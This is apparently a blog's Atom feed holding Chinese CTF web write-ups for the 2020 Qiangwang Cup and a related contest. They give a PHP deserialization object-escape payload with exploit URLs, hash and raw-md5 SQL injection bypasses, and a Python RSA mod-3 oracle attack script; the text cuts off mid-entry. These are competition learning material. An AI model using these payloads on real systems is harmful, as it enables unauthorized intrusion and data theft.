<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sky&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://skysec.top/"/>
  <updated>2020-08-27T04:15:50.845Z</updated>
  <id>http://skysec.top/</id>
  
  <author>
    <name>一叶飘零</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020 首届钓鱼城杯国际网络安全创新赛Web WriteUp</title>
    <link href="http://skysec.top/2020/08/27/2020-%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%E5%9B%BD%E9%99%85%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E8%B5%9BWeb-WriteUp/"/>
    <id>http://skysec.top/2020/08/27/2020-首届钓鱼城杯国际网络安全创新赛Web-WriteUp/</id>
    <published>2020-08-27T03:24:59.000Z</published>
    <updated>2020-08-27T04:15:50.845Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/2020-08-27-11-25-26.png" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</span><br><span class="line">    $hash = <span class="string">''</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-27-12-15-50.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/2020-08-27-11-25-26.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2020 第四届强网杯全国网络安全挑战赛Online Writeup</title>
    <link href="http://skysec.top/2020/08/23/2020-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9BOnline-Writeup/"/>
    <id>http://skysec.top/2020/08/23/2020-第四届强网杯全国网络安全挑战赛Online-Writeup/</id>
    <published>2020-08-23T04:54:07.000Z</published>
    <updated>2020-08-24T14:00:45.277Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末参加了强网杯线上赛，以下是web题解。</p><h2 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h2><p>类定义如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $user;</span><br><span class="line">    <span class="keyword">protected</span> $pass;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass, $admin = <span class="number">0</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = $admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">'Riven'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"function"</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"object"</span>)&#123;</span><br><span class="line">            $name = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">            $name();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;TP();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">'Yasuo'</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">'Yasuo'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"No Yasuo! No Soul!\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Gank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">'Yasuo'</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Are you orphan?\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Must Be Yasuo!\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"cat /flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;KS();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>整体来说，链还是比较容易找到的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">topsolo -&gt; __destruct -&gt; TP -&gt; $name() -&gt; midsolo -&gt; __invoke -&gt; Gank -&gt; stristr($this-&gt;name, &apos;Yasuo&apos;) -&gt; jungle -&gt; __toString -&gt; KS</span><br></pre></td></tr></table></figure></p><p>其中midsolo中有wakeup限制：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">'Yasuo'</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">'Yasuo'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"No Yasuo! No Soul!\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>不过也是老考点了，比较好绕过。关键点是2个：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$player = <span class="keyword">new</span> player($username, $password);</span><br><span class="line">file_put_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]), write(serialize($player)));</span><br></pre></td></tr></table></figure></p><p>首先我们对象需要逃逸，否则无法反序列化我们想要的对象，其次存在对象属性名过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($data, <span class="string">'name'</span>)!==<span class="keyword">False</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Name Pass\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>属性名过滤我们可以通过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\6e\61\6d\65</span><br></pre></td></tr></table></figure></p><p>来进行bypass，而对于对象逃逸，已经是之前考察过的考点了，可以参考：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/Wanghaoran-s1mple/p/13160708.html</span><br></pre></td></tr></table></figure></p><p>因此我们可以通过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user = &apos;0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&apos;;</span><br><span class="line">$pass=&apos;0&quot;;s:7:&quot;\0*\0pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;\0*\0\6e\61\6d\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;\0*\0\6e\61\6d\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;\0*\0\6e\61\6d\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;&#125;;&apos;;</span><br></pre></td></tr></table></figure></p><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zefq4smu487cmezc2u4.cloudeci1.ichunqiu.com/?username=0%5C0%2A%5C0%5C0%2A%5C0%5C0%2A%5C0%5C0%2A%5C0%5C0%2A%5C0%5C0%2A%5C0%5C0%2A%5C0%5C0%2A%5C0%5C0%2A%5C0%5C0%2A%5C0%5C0%2A%5C0%5C0%2A%5C0&amp;password=0%22%3Bs%3A7%3A%22%5C0%2A%5C0pass%22%3BO%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%5C0%2A%5C0%5C6e%5C61%5C6d%5C65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%5C0%2A%5C0%5C6e%5C61%5C6d%5C65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%5C0%2A%5C0%5C6e%5C61%5C6d%5C65%22%3Bs%3A7%3A%22Lee+Sin%22%3B%7D%7D%7D%7D%3B</span><br></pre></td></tr></table></figure></p><p>再触发反序列化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zefq4smu487cmezc2u4.cloudeci1.ichunqiu.com/play.php</span><br></pre></td></tr></table></figure></p><p>即可获取flag：<br><img src="/images/2020-08-23-13-47-19.png" alt=""></p><h2 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目源码如上，还是比较简单的，对于第一关可以使用0e开头的字符串，第二关可以使用数组，第三关则是一道老题，参考：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/12125291f50d</span><br></pre></td></tr></table></figure></p><p>用<code>ffifdyop</code>即可。<br>因此最后可使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.101.177.96/?hash1=0e251288019&amp;hash2[]=2&amp;hash3[]=1&amp;hash4=ffifdyop</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-23-12-59-32.png" alt=""></p><h2 id="dice2cry"><a href="#dice2cry" class="headerlink" title="dice2cry"></a>dice2cry</h2><p>访问题目，发现cookie里放有rsa的信息：<br><img src="/images/2020-08-23-14-14-06.png" alt=""><br>同时发现存在文件泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://106.14.66.189/abi.php.bak</span><br></pre></td></tr></table></figure></p><p>源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line">        $data = json_decode($json_string, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        $rand_number = <span class="keyword">isset</span>($_POST[<span class="string">'this_is.able'</span>]) ? $_POST[<span class="string">'this_is.able'</span>] : mt_rand();</span><br><span class="line">        $n = gmp_init($data[<span class="string">'n'</span>]);</span><br><span class="line">        $d = gmp_init($data[<span class="string">'d'</span>]);</span><br><span class="line">        $c = gmp_init($rand_number);</span><br><span class="line">        $m = gmp_powm($c,$d,$n);</span><br><span class="line">        $v3 = gmp_init(<span class="string">'3'</span>);</span><br><span class="line">        $r = gmp_mod($m,$v3);</span><br><span class="line">        $result=(int)gmp_strval($r);</span><br><span class="line">        $dice = <span class="keyword">array</span>(<span class="string">"num"</span>=&gt;$result);</span><br><span class="line">        $json_obj = json_encode($dice);</span><br><span class="line">        <span class="keyword">echo</span> $json_obj;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现可以传递参数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">'this_is.able'</span>]</span><br></pre></td></tr></table></figure></p><p>但是this_is.able传递时，点会被替换成下划线：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this_is.able  -&gt;  this_is_able</span><br></pre></td></tr></table></figure></p><p>因此需要想办法绕过，这里查看底层处理方式main/php_variables.c，可以得知：<br><img src="/images/2020-08-23-14-18-24.png" alt=""><br>因此可以使用[来进行绕过，传参方式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this[is.able = xxxx</span><br></pre></td></tr></table></figure></p><p>后面则是密码学的部分：<br>需要将：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack</span><br></pre></td></tr></table></figure></p><p>推广到mod 3的情况。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line">url = <span class="string">'http://106.14.66.189/abi.php'</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">88611057676672840595766841579824069470206217129946135596214197506349717390763743327290683433946015480328468579057197141666127494006706093641604245416988006600651700656395596042499486504530580142311065863535717536001796279609016521570885772000690737095374160233594633294536318766991741757802548582282701543671</span></span><br><span class="line">n=<span class="number">0x8f5dc00ef09795a3efbac91d768f0bff31b47190a0792da3b0d7969b1672a6a6ea572c2791fa6d0da489f5a7d743233759e8039086bc3d1b28609f05960bd342d52bffb4ec22b533e1a75713f4952e9075a08286429f31e02dbc4a39e3332d2861fc7bb7acee95251df77c92bd293dac744eca3e6690a7d8aaf855e0807a1157</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_result_of_mod3</span><span class="params">(mm)</span>:</span></span><br><span class="line"> payload = str(mm)</span><br><span class="line"></span><br><span class="line"> data = &#123;</span><br><span class="line">  <span class="string">'this[is.able'</span>:payload</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> Cookie = &#123;</span><br><span class="line"> <span class="string">'PHPSESSID'</span>:<span class="string">'vpbteni7ahq83jh1chfs3kvug7'</span>,</span><br><span class="line"> <span class="string">'public_e'</span>:<span class="string">'010001'</span>,</span><br><span class="line"> <span class="string">'encrypto_flag'</span>:<span class="string">'88611057676672840595766841579824069470206217129946135596214197506349717390763743327290683433946015480328468579057197141666127494006706093641604245416988006600651700656395596042499486504530580142311065863535717536001796279609016521570885772000690737095374160233594633294536318766991741757802548582282701543671; public_n=8f5dc00ef09795a3efbac91d768f0bff31b47190a0792da3b0d7969b1672a6a6ea572c2791fa6d0da489f5a7d743233759e8039086bc3d1b28609f05960bd342d52bffb4ec22b533e1a75713f4952e9075a08286429f31e02dbc4a39e3332d2861fc7bb7acee95251df77c92bd293dac744eca3e6690a7d8aaf855e0807a1157'</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> r = requests.post(url=url,data=data,cookies=Cookie)</span><br><span class="line"> <span class="comment">#print r.content </span></span><br><span class="line"> <span class="keyword">return</span> int(json.loads(r.content)[<span class="string">'num'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(c,e,n)</span>:</span></span><br><span class="line">    R = n%<span class="number">3</span></span><br><span class="line"></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    exp3 = <span class="number">3</span></span><br><span class="line">    length = n</span><br><span class="line">    low_bound = Fraction(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> length&gt;<span class="number">1</span>:</span><br><span class="line">        tmp_c = (pow(exp3,e,n)*c) % n</span><br><span class="line">        r = give_result_of_mod3(tmp_c)</span><br><span class="line">        k = (-r* inverse(R,<span class="number">3</span>)) % <span class="number">3</span></span><br><span class="line">        low_bound += Fraction(k*n,exp3)</span><br><span class="line"></span><br><span class="line">        exp3 *= <span class="number">3</span></span><br><span class="line">        length = length//<span class="number">3</span></span><br><span class="line">        j +=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> int(low_bound)</span><br><span class="line"></span><br><span class="line">res = hack(c,e,n)</span><br><span class="line"></span><br><span class="line">print(n2s(res))</span><br></pre></td></tr></table></figure></p><p>flag{92ab3055092aad3e1856481091</p><h2 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h2><p>题目给出了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$flag=file_get_contents(<span class="string">'ssrf.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $result;</span><br><span class="line">        <span class="keyword">print</span> $result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 